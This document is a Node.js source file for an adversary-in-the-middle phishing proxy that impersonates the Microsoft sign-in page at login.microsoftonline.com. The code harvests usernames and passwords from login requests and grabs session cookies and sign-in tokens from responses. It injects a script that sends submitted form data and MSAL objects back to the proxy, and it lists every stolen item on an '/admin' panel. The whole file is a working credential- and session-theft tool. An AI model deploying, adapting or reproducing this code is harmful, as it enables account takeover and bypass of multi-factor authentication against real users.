const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const bodyParser = require('body-parser');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
const PORT = process.env.PORT || 3000;

// Storage
const CAPTURES_FILE = './captures.json';
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');

// Parse all body types
app.use(bodyParser.raw({ type: '*/*', limit: '50mb' }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// Capture function
function saveCapture(type, data) {
    const capture = {
        timestamp: new Date().toISOString(),
        type: type,
        ...data
    };
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    captures.push(capture);
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
    console.log(`[${type.toUpperCase()}]`, JSON.stringify(data, null, 2));
}

// Proxy to Microsoft with interception
const proxy = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    ws: true,
    selfHandleResponse: true, // We handle response manually to capture data
    
    onProxyReq: (proxyReq, req, res) => {
        // Log the request
        const data = {
            method: req.method,
            url: req.url,
            headers: req.headers,
            ip: req.headers['x-forwarded-for'] || req.ip,
            body: req.body?.toString?.() || req.body
        };
        
        // Check for credentials in POST body
        if (req.method === 'POST' && req.body) {
            const bodyStr = req.body.toString ? req.body.toString() : JSON.stringify(req.body);
            
            // Common Microsoft credential fields
            if (bodyStr.includes('login') || bodyStr.includes('passwd') || bodyStr.includes('password')) {
                try {
                    const params = new URLSearchParams(bodyStr);
                    const login = params.get('login') || params.get('email') || params.get('username');
                    const pass = params.get('passwd') || params.get('password');
                    
                    if (login && pass) {
                        saveCapture('credentials', { login, pass, url: req.url });
                    }
                } catch(e) {}
                
                // Try JSON format too
                try {
                    const json = JSON.parse(bodyStr);
                    if (json.username && json.password) {
                        saveCapture('credentials', { 
                            login: json.username, 
                            pass: json.password,
                            url: req.url 
                        });
                    }
                } catch(e) {}
            }
        }
        
        saveCapture('request', data);
        
        // Write body to proxied request if it exists
        if (req.body && proxyReq.write) {
            proxyReq.write(req.body);
        }
    },
    
    onProxyRes: (proxyRes, req, res) => {
        let body = [];
        
        // Decompress if needed
        const encoding = proxyRes.headers['content-encoding'];
        
        proxyRes.on('data', chunk => body.push(chunk));
        proxyRes.on('end', () => {
            let buffer = Buffer.concat(body);
            
            // Decompress
            if (encoding === 'gzip') {
                try { buffer = zlib.gunzipSync(buffer); } catch(e) {}
            } else if (encoding === 'deflate') {
                try { buffer = zlib.inflateSync(buffer); } catch(e) {}
            }
            
            const bodyStr = buffer.toString();
            
            // Capture cookies (session tokens)
            if (proxyRes.headers['set-cookie']) {
                saveCapture('session', {
                    cookies: proxyRes.headers['set-cookie'],
                    url: req.url
                });
            }
            
            // Look for tokens in response body
            if (bodyStr.includes('ESTSAUTH') || bodyStr.includes('SignInToken')) {
                const tokenMatch = bodyStr.match(/"token":"([^"]+)"/);
                if (tokenMatch) {
                    saveCapture('token', { token: tokenMatch[1] });
                }
            }
            
            // Modify response - inject tracking script
            const contentType = proxyRes.headers['content-type'] || '';
            if (contentType.includes('text/html') && bodyStr.includes('</body>')) {
                const injection = `
                <script>
                // Capture form submissions
                document.addEventListener('submit', function(e) {
                    var fd = new FormData(e.target);
                    var data = {};
                    fd.forEach((v,k) => data[k] = v);
                    navigator.sendBeacon('/capture-js', JSON.stringify(data));
                });
                
                // Capture any tokens in page
                if (window.msal) {
                    fetch('/capture-js', {
                        method: 'POST',
                        body: JSON.stringify({type: 'msal', data: window.msal})
                    });
                }
                </script>
                `;
                
                const modified = bodyStr.replace('</body>', injection + '</body>');
                buffer = Buffer.from(modified);
                
                // Re-compress if needed
                if (encoding === 'gzip') {
                    buffer = zlib.gzipSync(buffer);
                } else if (encoding === 'deflate') {
                    buffer = zlib.deflateSync(buffer);
                }
            }
            
            // Send response to client
            res.status(proxyRes.statusCode);
            Object.keys(proxyRes.headers).forEach(key => {
                if (key !== 'content-encoding' || !encoding) {
                    res.setHeader(key, proxyRes.headers[key]);
                }
            });
            if (encoding) res.setHeader('content-encoding', encoding);
            res.end(buffer);
        });
    }
});

// JS capture endpoint (for injected script)
app.post('/capture-js', express.json(), (req, res) => {
    saveCapture('javascript', req.body);
    res.sendStatus(200);
});

// Admin panel
app.get('/admin', (req, res) => {
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>AiTM Admin</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            .cred { background: #1a1a1a; border-left: 3px solid #0f0; padding: 10px; margin: 10px 0; }
            .token { color: #ff0; word-break: break-all; }
            pre { overflow-x: auto; }
        </style>
    </head>
    <body>
        <h1>Captured Sessions: ${captures.length}</h1>
        <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear</button>
        <hr>
        ${captures.reverse().map(c => `
            <div class="cred">
                <strong>${c.type.toUpperCase()}</strong> - ${c.timestamp}<br>
                ${c.login ? `<div>User: ${c.login}</div>` : ''}
                ${c.pass ? `<div>Pass: ${c.pass}</div>` : ''}
                ${c.cookies ? `<div class="token">Cookies: ${c.cookies.join('; ')}</div>` : ''}
                ${c.token ? `<div class="token">Token: ${c.token}</div>` : ''}
                <pre>${JSON.stringify(c, null, 2)}</pre>
            </div>
        `).join('')}
    </body>
    </html>
    `);
});

app.post('/clear', (req, res) => {
    fs.writeFileSync(CAPTURES_FILE, '[]');
    res.json({ cleared: true });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'AiTM active', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
});

// Apply proxy to all routes
app.use('/', proxy);

app.listen(PORT, () => {
    console.log(`AiTM Proxy running on port ${PORT}`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
    console.log(`Target: https://login.microsoftonline.com`);
});
